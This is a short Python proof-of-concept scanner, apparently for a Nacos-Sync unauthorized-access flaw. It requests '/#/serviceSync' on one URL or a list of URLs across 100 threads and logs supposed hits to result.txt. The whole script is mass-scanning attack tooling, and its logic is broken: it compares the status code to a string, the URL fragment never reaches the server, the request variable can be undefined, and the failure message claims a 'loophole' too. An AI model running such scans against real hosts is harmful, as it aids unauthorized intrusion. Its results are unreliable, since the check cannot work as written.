#Nacos-Sync未授权访问漏洞poc
import requests,argparse,sys,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    text="""


███╗   ██╗ █████╗  ██████╗ ██████╗ ███████╗      ███████╗██╗   ██╗███╗   ██╗ ██████╗
████╗  ██║██╔══██╗██╔════╝██╔═══██╗██╔════╝      ██╔════╝╚██╗ ██╔╝████╗  ██║██╔════╝
██╔██╗ ██║███████║██║     ██║   ██║███████╗█████╗███████╗ ╚████╔╝ ██╔██╗ ██║██║     
██║╚██╗██║██╔══██║██║     ██║   ██║╚════██║╚════╝╚════██║  ╚██╔╝  ██║╚██╗██║██║     
██║ ╚████║██║  ██║╚██████╗╚██████╔╝███████║      ███████║   ██║   ██║ ╚████║╚██████╗
╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝      ╚══════╝   ╚═╝   ╚═╝  ╚═══╝ ╚═════╝
                                                                                    
                                               author:zm
"""
    print(text)
def main():
    banner()
    arges=argparse.ArgumentParser(description='This is Nacos Sync Unauthorized Access Vulnerability POC')
    arges.add_argument('-u','--url',dest='url',type=str,help='Please input your link')
    arges.add_argument('-f','--file',dest='file',type=str,help='Please input your file path')
    arg=arges.parse_args()
    if arg.url and not arg.file:
        poc(arg.url)
    elif arg.file and not arg.url:
        url_list=[]
        with open (arg.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
            mp=Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python {sys.argv[0]} -h")
def poc(target):
    api='/#/serviceSync'
    try:
        res=requests.get(url=target+api,verify=False)
    except:
        pass
    if res.status_code=='200':
        print(f"[+]{target} have loophole “{target+api}”")
        with open ('result.txt','a',encoding='utf-8') as f:
            f.write(target+'\n')
    else:
        print(f"[-]{target} have loophole")
if __name__=='__main__':
    main()